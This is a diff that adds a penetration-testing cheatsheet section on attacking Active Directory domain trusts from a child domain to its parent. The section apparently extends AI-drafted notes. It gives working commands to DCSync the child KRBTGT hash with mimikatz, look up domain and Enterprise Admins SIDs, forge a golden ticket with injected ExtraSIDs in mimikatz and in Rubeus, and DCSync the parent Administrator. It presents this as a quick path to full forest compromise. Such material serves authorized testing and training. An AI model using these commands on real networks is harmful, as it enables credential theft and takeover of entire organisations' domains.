@@ -207,6 +207,97 @@ Useful when you don’t have PowerView but do have domain-joined Windows host + 
   * Any **bidirectional** trusts with unknown or untested security posture.
   * Realistic attack paths (e.g., Kerberoasting in trusted domain → admin in primary).
 
+
 ---
 
-If you want, I can next turn this into a 1–2 slide summary (bullet points + visual) that you can drop straight into a deck.
+## **Attacking Domain Trusts – Child → Parent (Quick Cheatsheet Continuation)**
+
+### **SID History Abuse (ExtraSIDs) – Summary**
+
+* Child → Parent compromise hinges on abusing **sidHistory**.
+* Injecting a privileged SID (e.g., **Enterprise Admins**) into a forged ticket lets a compromised **child-domain account** act as a **forest admin**.
+* Works because **SID Filtering is NOT applied within the same forest**.
+
+---
+
+### **Requirements for ExtraSIDs Attack**
+
+You need:
+
+* Child domain KRBTGT **NT hash**
+* Child domain **SID**
+* Parent domain **Enterprise Admins SID**
+* Child domain **FQDN**
+* Any username (real or fake)
+
+---
+
+### **Commands (Minimal Edition)**
+
+#### **1. DCSync KRBTGT Hash**
+
+```powershell
+mimikatz # lsadump::dcsync /user:CHILDDOMAIN\krbtgt
+```
+
+#### **2. Get Child Domain SID**
+
+```powershell
+Get-DomainSID
+```
+
+#### **3. Get Enterprise Admins SID**
+
+```powershell
+Get-DomainGroup -Domain ROOTDOMAIN -Identity "Enterprise Admins"
+```
+
+---
+
+### **4. Create Golden Ticket (Mimikatz)**
+
+```powershell
+mimikatz # kerberos::golden /user:hacker /domain:CHILD.DOMAIN.LOCAL `
+/sid:<child-domain-sid> /krbtgt:<krbtgt-hash> `
+/sids:<enterprise-admins-sid> /ptt
+```
+
+### **5. Verify Ticket**
+
+```powershell
+klist
+```
+
+### **6. Test Parent-Domain Access**
+
+```powershell
+ls \\PARENT-DC\c$
+```
+
+---
+
+## **ExtraSIDs (Rubeus Version)**
+
+```powershell
+.\Rubeus.exe golden /rc4:<krbtgt-hash> /domain:CHILD.DOMAIN.LOCAL `
+/sid:<child-sid> /sids:<enterprise-admin-sid> /user:hacker /ptt
+```
+
+---
+
+## **Full Compromise Test: DCSync Parent Domain**
+
+```powershell
+mimikatz # lsadump::dcsync /user:PARENT\Administrator
+```
+
+If this works → **you own the forest**.
+
+---
+
+## **Key Takeaway**
+
+Once the **child domain is popped**, forging a ticket with the parent’s **Enterprise Admin SID** instantly escalates privileges across the trust. This is one of the fastest paths to **full forest compromise**.
+
+---
+
